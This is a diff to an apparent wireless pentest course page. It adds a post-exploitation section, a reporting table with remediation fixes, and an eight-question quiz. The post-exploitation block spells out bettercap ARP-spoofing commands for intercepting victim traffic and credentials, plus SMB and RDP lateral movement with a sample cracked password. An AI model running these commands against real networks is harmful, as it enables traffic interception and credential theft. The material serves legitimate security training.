@@ -142,6 +142,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -365,7 +386,99 @@
       </div>
     </section>
 
-    <!-- Section 4: Remediation -->
+    <!-- Section 4: Post-Exploitation -->
+    <section id="postexploit">
+      <h2><span class="section-num">04</span> Post-Exploitation</h2>
+      <p>
+        Gaining Wi-Fi access is not the end of the engagement. Post-exploitation determines the actual business impact
+        and provides evidence for the pentest report.
+      </p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Network mapping + MITM after gaining PSK access</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-postexploit')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-postexploit"><span class="cmt"># After connecting with cracked PSK — map the internal network</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo nmap <span class="flag">-sn</span> 192.168.1.0/24</span>
+<span class="out-ok">Host: 192.168.1.1   (gateway/router)</span>
+<span class="out-ok">Host: 192.168.1.50  (Windows workstation)</span>
+<span class="out-ok">Host: 192.168.1.100 (IoT device)</span>
+
+<span class="cmt"># Full port scan + service detection on interesting hosts</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo nmap <span class="flag">-sV</span> <span class="flag">-sC</span> <span class="flag">-p-</span> 192.168.1.50 <span class="flag">-oN</span> /tmp/scan.txt</span>
+
+<span class="cmt"># ARP MITM with bettercap — intercept all victim traffic</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo bettercap <span class="flag">-iface</span> wlan0</span>
+<span class="out">bettercap&gt; </span><span class="cmd">set arp.spoof.targets 192.168.1.50</span>
+<span class="out">bettercap&gt; </span><span class="cmd">arp.spoof on</span>       <span class="cmt"># Position between victim and gateway</span>
+<span class="out">bettercap&gt; </span><span class="cmd">net.sniff on</span>      <span class="cmt"># Capture all plaintext traffic</span>
+<span class="out">bettercap&gt; </span><span class="cmd">http.proxy on</span>     <span class="cmt"># HTTP proxy for credential interception</span>
+<span class="out">bettercap&gt; </span><span class="cmd">events.show</span>       <span class="cmt"># View captured credentials in real time</span>
+
+<span class="cmt"># If enterprise creds captured (Chain 5) — try lateral movement via SMB</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">smbclient <span class="flag">-L</span> //192.168.1.50 <span class="flag">-U</span> <span class="str">"CORP\\alice%Summer2024!"</span></span>
+<span class="out-ok">Sharename    Type    Comment</span>
+<span class="out-ok">---------    ----    -------</span>
+<span class="out-ok">C$           Disk    Default share</span>
+<span class="out-ok">ADMIN$       Disk    Remote Admin</span>
+<span class="out-warn">IT_Files     Disk    Internal IT share ← lateral movement target</span>
+
+<span class="cmt"># Or connect to internal RDP</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">xfreerdp /v:192.168.1.50 /u:alice /p:Summer2024! /d:CORP</span></div>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>Chain 5 operational value:</strong> Captured MSCHAPv2 → cracked AD password. That single credential is valid for email, VPN, SharePoint, SMB shares, and RDP — far beyond just Wi-Fi access. This is why WPA2-Enterprise attacks are the highest-value wireless engagements.</div>
+      </div>
+    </section>
+
+    <!-- Section 5: Reporting -->
+    <section id="reporting">
+      <h2><span class="section-num">05</span> Reporting &amp; Remediation</h2>
+      <p>Every wireless pentest ends with a report. The quality of findings documentation determines whether clients actually fix the vulnerabilities.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Evidence collection commands for report</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-report')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-report"><span class="cmt"># Save airodump-ng scan results for report appendix</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng <span class="flag">--wps</span> <span class="flag">--manufacturer</span> <span class="flag">-w</span> /tmp/evidence/recon <span class="flag">--output-format</span> <span class="str">csv,pcap</span> wlan0mon</span>
+
+<span class="cmt"># Capture screen evidence of cracked PSK</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hashcat <span class="flag">-m</span> <span class="str">22000</span> hashes.hc22000 <span class="flag">--show</span> | tee /tmp/evidence/cracked_passwords.txt</span>
+
+<span class="cmt"># Document WPS vulnerability</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wash <span class="flag">-i</span> wlan0mon <span class="flag">-s</span> 2>/dev/null | tee /tmp/evidence/wps_scan.txt</span>
+
+<span class="cmt"># Verify PMKID exposure (informational finding)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hcxpcapngtool <span class="flag">--info</span> capture.pcapng | tee /tmp/evidence/pmkid_info.txt</span>
+
+<span class="cmt"># Generate network map for report</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo nmap <span class="flag">-sV</span> <span class="flag">--top-ports</span> <span class="str">100</span> 192.168.1.0/24 <span class="flag">-oX</span> /tmp/evidence/network_map.xml</span></div>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Finding</th><th>CVSS</th><th>Severity</th><th>Chains</th><th>Fix</th></tr></thead>
+          <tbody>
+            <tr><td>WPS enabled (vulnerable firmware)</td><td>9.8</td><td style="color:var(--accent3)">Critical</td><td>Chain 4</td><td>Disable WPS entirely</td></tr>
+            <tr><td>Weak WPA2-PSK cracked</td><td>8.1</td><td style="color:var(--accent3)">Critical</td><td>Chain 1, 2</td><td>20+ char random PSK or WPA3</td></tr>
+            <tr><td>PEAP without cert validation</td><td>8.8</td><td style="color:var(--accent3)">Critical</td><td>Chain 5</td><td>Pin RADIUS CA + CN on all supplicants</td></tr>
+            <tr><td>WPA3 transition mode</td><td>6.5</td><td style="color:var(--warn)">High</td><td>Chain 1, 2</td><td>WPA3-only mode</td></tr>
+            <tr><td>No 802.11w (MFP)</td><td>6.5</td><td style="color:var(--warn)">High</td><td>Chain 1, 3</td><td>Enable mandatory MFP</td></tr>
+            <tr><td>Open AP present</td><td>7.5</td><td style="color:var(--warn)">High</td><td>Chain 3</td><td>Remove or replace with WPA3</td></tr>
+            <tr><td>PMKID exposed (strong PSK)</td><td>3.1</td><td style="color:var(--accent)">Low</td><td>Chain 2</td><td>Mitigated by strong passphrase</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Section 6: Remediation -->
     <section id="remediation">
       <h2><span class="section-num">04</span> Remediation Priority Matrix</h2>
 
@@ -392,6 +505,125 @@
       </div>
     </section>
 
+    <!-- Section 7: Final Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">07</span> Final Course Knowledge Check</h2>
+      <p>The capstone quiz covers the full course — decision-making, chain selection, and remediation.</p>
+
+      <div class="quiz-container">
+        <h3>&#127358; Final Course Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions — all modules</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">Using the decision tree: a target AP has WPS enabled (Lck=No, version 2.0), WPA2-PSK, and 3 connected clients. Which chain do you run first and why?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">Chain 1 — deauth clients and capture the handshake; fastest for PSK recovery</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">Chain 4 — WPS Pixie Dust first; if vulnerable firmware, compromises the network in under 30 seconds. If Pixie Dust fails, fall back to Chain 1 or 2</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">Chain 2 — PMKID capture; no deauth noise and works even without clients</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">Chain 3 — evil twin; captures the PSK directly from clients without cracking</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">In Chain 1, why must you convert the airodump-ng <code>.cap</code> file with <code>hcxpcapngtool</code> before running hashcat?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because hashcat cannot read .cap files — it requires .pcapng format only</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">hashcat -m 22000 requires the .hc22000 format (WPA*01*/WPA*02* lines). hcxpcapngtool extracts PMKID and EAPOL hashes from the raw capture into this format. aircrack-ng can read .cap directly but hashcat cannot</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because hcxpcapngtool decrypts the WPA2 frames so hashcat only needs to verify them</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">To strip unnecessary frames and reduce file size for faster cracking</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">Chain 3 (Evil Twin + Captive Portal) is the only chain that works when the WPA2 passphrase is truly uncrackable (25+ random chars). Why?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">Because it bypasses WPA2 encryption entirely using NAT tunneling</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">Chain 3 never cracks the passphrase — it uses social engineering to trick users into entering their credentials (WPA2 PSK or login credentials) into a fake portal page. It is independent of passphrase strength</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">Because dnsmasq resolves the PSK from cached DNS entries</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">It still requires cracking — but cewl generates a target-specific wordlist that finds even strong passwords</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">After Chain 5 captures and cracks MSCHAPv2 for alice@corp.com with password "Summer2024!", what two post-exploitation steps demonstrate maximum business impact in a report?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">Scan for more WPS targets on the same channel; set up a second evil twin</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">Test the credentials against SMB shares (smbclient) and RDP/VPN to demonstrate lateral movement, and enumerate accessible internal resources — proving the credential provides access far beyond Wi-Fi</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">Run hashcat on the NT hash to verify the password is correct before reporting</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">Deploy a persistent KARMA AP so the credential can be captured again if changed</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">The auto_attack.sh script checks WPS before attempting handshake capture. What is the logic behind this prioritization?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">WPS is checked first because it requires fewer tools and less network access</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">A successful Pixie Dust attack takes under 30 seconds and reveals the actual WPA2 passphrase (not just a handshake hash to crack). If WPS is available, it's the fastest path. Only if WPS is disabled or locked does the script fall back to the slower handshake capture workflow</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">WPS is checked because it bypasses 802.11w (PMF) which would otherwise block deauth</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">WPS is the most reliable method because it works on all WPA2 networks regardless of client activity</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">What single remediation from the priority matrix would neutralize Chain 1, Chain 2, and significantly reduce Chain 3's effectiveness?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">Enable 802.11w (MFP) to block deauthentication attacks</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">Disable WPS on all access points</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">Migrate to WPA3-SAE: eliminates offline dictionary attacks (Chain 1/2 become computationally infeasible), and for Chain 3 — if clients are configured to only trust WPA3 with PMF, the evil twin must match or they won't connect</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">Deploy a WIDS to detect and alert on deauth floods and beacon anomalies</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">In Chain 2, after capturing PMKIDs with hcxdumptool, the hash file shows 0 lines after conversion. What is the most likely cause?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">The APs use WPA3-SAE which does not include PMKIDs</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">hashcat doesn't support -m 22000 on this version — use -m 2500 instead</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">hcxdumptool ran with --enable_status missing (v6+) and captured nothing, OR no APs responded to association requests during the capture window. Try --active_beacon and longer capture duration, or verify hcxdumptool version flags</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">The NetworkManager was stopped too early — restart it and run hcxdumptool again</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">A pentest report shows "PMKID exposed" with CVSS 3.1 (Low) for a network using a 25-character random passphrase. Is this correct, and why?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)">No — PMKID exposure is always Critical because it enables offline cracking of any WPA2 network</button>
+            <button class="option-btn" onclick="answer(this,'q8',true)">Yes — PMKID exposure is only dangerous if the passphrase is weak enough to crack. A 25-char random passphrase has ~120 bits of entropy; at 1.2M H/s it would take longer than the age of the universe. The finding is informational/low — the real fix (WPA3) is a best practice, not a critical gap</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">No — PMKID attacks are passive; any severity above Informational is incorrect</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">No — PMKID only works on WPA2, so WPA3 transition mode APs should be Critical</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <!-- Completion Banner -->
     <div class="completion-banner">
       <h2>Course Complete</h2>
@@ -407,6 +639,89 @@
 </div>
 
 <script>
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. The decision tree always checks WPS first because Pixie Dust is the fastest possible attack — a single WPS exchange (M1-M3) and offline computation yields the full WPA2 passphrase in seconds. No wordlist, no GPU, no clients needed. Chain 1 (handshake) and Chain 2 (PMKID) both still require cracking and can take hours.",
+      wrong: "Incorrect. The decision tree prioritizes WPS (Chain 4) because Pixie Dust is the fastest possible attack — under 30 seconds for the full PSK on vulnerable firmware. No cracking required. Chain 1 requires deauth and handshake capture. Chain 2 is clientless but still needs cracking. Always check WPS first."
+    },
+    q2: {
+      correct: "Correct. hashcat's -m 22000 mode reads a specific text format: 'WPA*01*...' (PMKID) or 'WPA*02*...' (EAPOL) lines. airodump-ng .cap files are raw pcap — hashcat cannot parse them directly. hcxpcapngtool extracts and formats the relevant cryptographic values into the .hc22000 format hashcat expects. aircrack-ng does read .cap directly, but is much slower than GPU hashcat.",
+      wrong: "Incorrect. hashcat -m 22000 requires the specific .hc22000 text format (WPA*01*/WPA*02* lines). airodump-ng .cap files are raw PCAP. hcxpcapngtool extracts the cryptographic values (PMKID, nonces, MIC) from the PCAP and formats them for hashcat. This conversion step is mandatory for GPU cracking."
+    },
+    q3: {
+      correct: "Correct. Chain 3 is purely social engineering — it does not crack the passphrase at all. The evil twin + captive portal tricks the user into voluntarily typing their password into what appears to be a legitimate Wi-Fi reconnect page. Passphrase complexity is irrelevant because the user provides it directly. A 50-character random passphrase is equally vulnerable if the user enters it.",
+      wrong: "Incorrect. Chain 3 (Evil Twin + Captive Portal) doesn't crack anything. It tricks the user into entering their password into a fake portal. The passphrase is provided voluntarily by the victim — length and complexity don't matter. This is why social engineering is often the most effective attack regardless of cryptographic strength."
+    },
+    q4: {
+      correct: "Correct. Wi-Fi access alone is one finding. Demonstrating that the same AD credentials work against SMB shares (smbclient), RDP, or VPN dramatically increases the business risk rating from Medium to Critical. The report shows: 'one captured hash grants access to email, file shares, and remote desktop across the corporate network.' This is the operational multiplier of enterprise wireless attacks.",
+      wrong: "Incorrect. The high-impact evidence for a Chain 5 finding is demonstrating that cracked AD credentials work beyond Wi-Fi — specifically SMB share enumeration, VPN authentication, and RDP access. This proves the credential is valid across the corporate network, justifying a Critical rating rather than just a High for wireless access alone."
+    },
+    q5: {
+      correct: "Correct. WPS Pixie Dust is the fastest attack in the toolkit — under 30 seconds for a successful exploit, revealing the actual WPA2 passphrase directly. Handshake capture (Chain 1) requires deauthing clients, waiting for reconnection, and potentially hours of cracking. PMKID (Chain 2) is clientless but still needs hours of GPU cracking. Speed and stealth both favor WPS first.",
+      wrong: "Incorrect. The script prioritizes WPS because Pixie Dust can compromise the network in under 30 seconds, yielding the literal passphrase without any cracking. Handshake and PMKID attacks both require dictionary/brute-force cracking which can take hours or fail entirely on strong passwords. If WPS is available and unlocked, it's always the first choice."
+    },
+    q6: {
+      correct: "Correct. WPA3-SAE (Dragonfly) replaces PSK with an interactive key exchange that cannot be attacked offline — eliminating Chain 1 and Chain 2. For Chain 3 (evil twin), clients configured for WPA3-only will refuse to connect to WPA2-only evil twins, reducing the attack surface. WPA3 mandates PMF, which also hardens against deauth-based Chain 3 techniques.",
+      wrong: "Incorrect. WPA3-SAE is the highest-impact single fix. It eliminates offline dictionary attacks entirely (defeating Chain 1 and Chain 2), mandates PMF (hardening Chain 3), and introduces forward secrecy. Disabling WPS only fixes Chain 4. 802.11w only hardens deauth. WIDS only detects — it doesn't prevent."
+    },
+    q7: {
+      correct: "Correct. hcxdumptool v6+ silently exits without output if --enable_status=1 (or higher) is missing. Without status output, the tool may appear to run but capture nothing. Also: if no APs are visible or none respond to association requests during the capture window, the pcapng file exists but contains no PMKID data. Check the hcxdumptool version and use --enable_status=1.",
+      wrong: "Incorrect. The most likely cause of 0 hashes is hcxdumptool v6+ running without --enable_status=1 (which causes silent no-output behavior) OR no APs responding during the capture window. WPA3-SAE networks don't produce crackable PMKIDs but they don't cause 0 hashes for all networks. The conversion tool handles format automatically."
+    },
+    q8: {
+      correct: "Correct. CVSS 3.1 (Low) is appropriate for PMKID exposure when the passphrase is genuinely strong. PMKID is a protocol feature that cannot be disabled — but with a 25-char random passphrase, offline cracking is computationally infeasible (~10^35 years at 1.2M H/s). The finding is informational/best-practice. If the passphrase were weak, the same finding would be Critical.",
+      wrong: "Incorrect. PMKID exposure severity depends entirely on passphrase strength. With a 25-character random passphrase (~120 bits entropy), cracking is computationally infeasible regardless of GPU speed. The finding is Low/Informational. The same finding against a network with 'password123' would be Critical. Context and exploitability determine CVSS."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      if (pct === 1) {
+        labelEl.textContent = 'Perfect score — you have mastered wireless network exploitation. Congratulations!';
+        numEl.style.color = 'var(--accent2)';
+      } else if (pct >= 0.75) {
+        labelEl.textContent = 'Strong performance — review the missed questions and their explanations.';
+        numEl.style.color = 'var(--warn)';
+      } else if (pct >= 0.5) {
+        labelEl.textContent = 'Getting there — revisit the chain decision tree, PMKID, and post-exploitation sections.';
+        numEl.style.color = 'var(--warn)';
+      } else {
+        labelEl.textContent = 'Re-read the attack selection, chain scripts, and remediation matrix sections.';
+        numEl.style.color = 'var(--accent3)';
+      }
+      scoreEl.classList.add('show');
+    }
+  }
+
   function copyTerm(btn, id) {
     const el = document.getElementById(id);
     navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
